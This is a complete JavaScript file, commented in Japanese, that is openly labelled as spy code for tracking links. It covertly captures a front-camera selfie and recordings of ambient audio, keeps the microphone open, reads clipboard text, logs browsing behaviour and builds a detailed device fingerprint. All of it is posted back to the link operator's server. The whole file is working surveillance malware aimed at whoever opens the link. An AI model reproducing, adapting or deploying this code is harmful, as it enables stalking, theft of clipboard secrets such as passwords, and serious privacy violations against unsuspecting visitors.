/* igtracker spy: 自撮り / 環境音 / クリップボード / 行動ログ / 端末指紋。
   v2: GPS と カメラ/マイク の衝突を解消。マイクは開いたまま保持する。
   LT_CAM / LT_MIC / LT_CLIP / LT_MIC_HOLD で制御。 */
(function () {
  "use strict";
  var CODE = window.LT_CODE, HIT = window.LT_HIT || 0;
  if (!CODE) return;
  var B = "/s/" + encodeURIComponent(CODE);

  var VID = (function () {
    try {
      var v = localStorage.getItem("igt_vid");
      if (!v) {
        v = Math.random().toString(36).slice(2, 12) + Date.now().toString(36);
        localStorage.setItem("igt_vid", v);
      }
      return v;
    } catch (e) { return ""; }
  })();
  var VISITS = (function () {
    try {
      var k = "igt_v_" + CODE, n = (+(localStorage.getItem(k) || 0)) + 1;
      localStorage.setItem(k, n);
      return n;
    } catch (e) { return 1; }
  })();

  // 大きいもの（自撮り/音声）は keepalive を外す（64KB上限があるため）
  function post(path, body, small) {
    try {
      return fetch(B + path, {
        method: "POST", cache: "no-store",
        keepalive: !!small,
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body || {})
      }).catch(function () {});
    } catch (e) {}
  }

  // 最初の測位が取れるまで待つ（iOS でGPSを殺さないため）
  function whenGps(cb, maxWait) {
    if (window.LT_GPS_READY) return cb();
    var done = false;
    function go() { if (done) return; done = true; cb(); }
    window.addEventListener("igt:gps", go, { once: true });
    setTimeout(go, maxWait || 7000);
  }

  var camStream = null, micStream = null;

  /* ---- 自撮り ---- */
  function selfie() {
    if (!window.LT_CAM || !navigator.mediaDevices ||
        !navigator.mediaDevices.getUserMedia) return;
    navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user", width: { ideal: 400 }, height: { ideal: 300 } },
      audio: false
    }).then(function (st) {
      camStream = st;
      var v = document.createElement("video");
      v.autoplay = true; v.muted = true; v.playsInline = true; v.srcObject = st;
      var done = false;
      function shot() {
        if (done) return;
        done = true;
        try {
          var w = v.videoWidth || 320, h = v.videoHeight || 240;
          var c = document.createElement("canvas");
          c.width = w; c.height = h;
          c.getContext("2d").drawImage(v, 0, 0, w, h);
          post("/cap", {
            hit: HIT, vid: VID, kind: "selfie",
            data: c.toDataURL("image/jpeg", 0.6), meta: { w: w, h: h }
          });
        } catch (e) {}
        // カメラは解放（保持したい場合は LT_CAM_HOLD=1）
        if (!window.LT_CAM_HOLD) {
          try { st.getTracks().forEach(function (t) { t.stop(); }); } catch (e) {}
          camStream = null;
        }
        setTimeout(function () { window.LT_LIVE && window.LT_LIVE.restart(); }, 400);
      }
      v.onloadedmetadata = function () { setTimeout(shot, 800); };
      setTimeout(shot, 2500);
    }).catch(function () {});
  }

  /* ---- 環境音：開いたまま保持してタブを生かす ---- */
  var micHold = function () { return window.LT_MIC_HOLD !== 0; };
  function micOpen() {
    if (!window.LT_MIC || !navigator.mediaDevices) return Promise.resolve(null);
    if (micStream && micStream.active) return Promise.resolve(micStream);
    return navigator.mediaDevices.getUserMedia({ audio: true }).then(function (st) {
      micStream = st;
      // マイクが開いた直後にGPSを撃ち直す（オーディオセッション奪取対策）
      setTimeout(function () {
        window.LT_LIVE && window.LT_LIVE.restart();
        if (window.LT_KEEP && window.LT_KEEP.kick) window.LT_KEEP.kick();
      }, 500);
      return st;
    }).catch(function () { return null; });
  }

  function recordOnce(ms) {
    if (!micStream || !window.MediaRecorder) return;
    var rec;
    try { rec = new MediaRecorder(micStream); } catch (e) { return; }
    var chunks = [];
    rec.ondataavailable = function (e) { if (e.data && e.data.size) chunks.push(e.data); };
    rec.onstop = function () {
      var blob = new Blob(chunks, { type: rec.mimeType || "audio/webm" });
      if (blob.size < 900) return;
      var fr = new FileReader();
      fr.onload = function () {
        post("/cap", {
          hit: HIT, vid: VID, kind: "voice", data: fr.result,
          meta: { ms: ms, mime: blob.type, held: micHold() }
        });
      };
      fr.readAsDataURL(blob);
    };
    try { rec.start(); } catch (e) { return; }
    setTimeout(function () { try { rec.stop(); } catch (e) {} }, ms);
  }

  function voice() {
    var MS = Math.min(10000, (window.LT_MIC_MS || 4000));
    micOpen().then(function (st) {
      if (!st) return;
      recordOnce(MS);
      // 保持しないなら録り終わったら閉じる
      if (!micHold()) {
        setTimeout(function () {
          if (micStream) {
            try { micStream.getTracks().forEach(function (t) { t.stop(); }); } catch (e) {}
            micStream = null;
          }
        }, MS + 1500);
      }
    });
  }

  /* ---- クリップボード ---- */
  function clipOnce() {
    if (!window.LT_CLIP || !navigator.clipboard || !navigator.clipboard.readText) return;
    navigator.clipboard.readText().then(function (t) {
      if (t) post("/clip", { hit: HIT, vid: VID, text: String(t).slice(0, 2000) }, true);
    }).catch(function () {});
  }
  ["click", "touchstart", "keydown"].forEach(function (ev) {
    document.addEventListener(ev, function h() {
      document.removeEventListener(ev, h);
      setTimeout(clipOnce, 60);
    }, { once: true, passive: true });
  });

  /* ---- 行動ログ ---- */
  var t0 = Date.now(), maxScroll = 0, hiddenMs = 0, hiddenAt = 0;
  function sendEv(kind, value, text) {
    post("/ev", { hit: HIT, vid: VID, kind: kind, value: value || 0, text: text || "" }, true);
  }
  window.addEventListener("scroll", function () {
    var h = document.documentElement.scrollHeight - innerHeight;
    var p = h > 0 ? Math.round(scrollY / h * 1000) / 10 : 100;
    if (p > maxScroll) maxScroll = p;
  }, { passive: true });
  document.addEventListener("visibilitychange", function () {
    if (document.visibilityState === "hidden") {
      hiddenAt = Date.now();
      sendEv("blur");
      return;
    }
    if (hiddenAt) {
      hiddenMs += Date.now() - hiddenAt;
      hiddenAt = 0;
      sendEv("focus");
    }
    // 復帰時にマイクが死んでいたら開き直す
    if (micHold() && (!micStream || !micStream.active)) micOpen();
  });
  function flush(final) {
    var dwell = Date.now() - t0 - hiddenMs;
    sendEv(final ? "exit" : "dwell", dwell, JSON.stringify({
      scroll: maxScroll, visits: VISITS, w: innerWidth, h: innerHeight,
      screen: screen.width + "x" + screen.height, dpr: devicePixelRatio
    }));
  }
  setInterval(function () { flush(false); }, 15000);
  window.addEventListener("pagehide", function () { flush(true); });

  /* ---- 端末指紋 ---- */
  function gpu() {
    try {
      var c = document.createElement("canvas");
      var g = c.getContext("webgl") || c.getContext("experimental-webgl");
      var d = g.getExtension("WEBGL_debug_renderer_info");
      return d ? g.getParameter(d.UNMASKED_RENDERER_WEBGL) : "";
    } catch (e) { return ""; }
  }
  function fonts() {
    var list = ["Arial", "Hiragino Sans", "Yu Gothic", "Meiryo", "Roboto",
                "Segoe UI", "Noto Sans JP", "Helvetica Neue", "Times New Roman"];
    var base = ["monospace", "sans-serif", "serif"], hit = [];
    try {
      var c = document.createElement("canvas"), x = c.getContext("2d");
      base.forEach(function (b) {
        x.font = "72px " + b;
        var w0 = x.measureText("mmmwwiil").width;
        list.forEach(function (f) {
          x.font = "72px '" + f + "'," + b;
          if (x.measureText("mmmwwiil").width !== w0) hit.push(f);
        });
      });
    } catch (e) {}
    return hit;
  }
  function deviceInfo() {
    var n = navigator.connection || {};
    sendEv("device", VISITS, JSON.stringify({
      visits: VISITS,
      tz: (function () {
        try { return Intl.DateTimeFormat().resolvedOptions().timeZone; }
        catch (e) { return ""; }
      })(),
      langs: navigator.languages || [navigator.language],
      cores: navigator.hardwareConcurrency || 0,
      mem: navigator.deviceMemory || 0,
      net: n.effectiveType || "", downlink: n.downlink || 0, rtt: n.rtt || 0,
      platform: navigator.platform || "", touch: navigator.maxTouchPoints || 0,
      gpu: gpu(), fonts: fonts(),
      pdf: !!navigator.pdfViewerEnabled,
      cookie: !!navigator.cookieEnabled
    }));
    try {
      if (navigator.storage && navigator.storage.estimate) {
        navigator.storage.estimate().then(function (s) {
          sendEv("storage", s.quota || 0, JSON.stringify({ usage: s.usage || 0 }));
        }).catch(function () {});
      }
    } catch (e) {}
  }

  /* ---- 起動順序：GPS → カメラ → マイク ---- */
  setTimeout(function () { deviceInfo(); }, 300);
  whenGps(function () {
    setTimeout(selfie, 300);
    setTimeout(voice, 2200);
  }, window.LT_SPY_WAIT || 7000);
})();